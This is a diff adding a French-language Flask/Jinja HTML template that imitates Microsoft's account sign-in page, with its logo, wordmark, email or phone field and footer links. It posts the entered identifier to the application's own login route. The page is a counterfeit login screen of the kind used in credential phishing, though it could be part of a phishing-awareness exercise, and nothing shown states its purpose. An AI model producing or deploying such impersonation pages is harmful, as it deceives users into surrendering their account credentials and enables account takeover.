@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Se connecter à votre compte Microsoft</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+  <div class="wrapper">
+    <div class="card">
+      <div class="logo">
+        <div class="logo-grid"><span></span><span></span><span></span><span></span></div>
+        <span class="logo-text">Microsoft</span>
+      </div>
+
+      <h1>Se connecter</h1>
+
+      <form method="POST" action="{{ url_for('login') }}" novalidate>
+
+  <div class="field {% if error %}has-error{% endif %}">
+    <input type="text"
+           name="email"
+           placeholder="E-mail, téléphone ou Skype"
+           autocomplete="username"
+           autofocus>
+  </div>
+
+  {% if error %}
+    <p class="error">{{ error }}</p>
+  {% endif %}
+
+  <div class="links">
+    <p>Vous n'avez pas encore de compte ?
+      <a href="#">Créez-en un !</a>
+    </p>
+
+    <p>
+      <a href="#">Votre compte n’est pas accessible ?</a>
+    </p>
+  </div>
+
+  <div class="actions">
+    <button type="submit" class="btn-primary">
+      Suivant
+    </button>
+  </div>
+
+</form>
+
+      <div class="divider">
+        <button type="button" class="option-row">
+          <span class="key-icon">&#128273;</span>
+          <span>Options de connexion</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="footer">
+      <a href="#">Conditions d'utilisation</a>
+      <a href="#">Confidentialité et cookies</a>
+    </div>
+  </div>
+</body>
+</html>
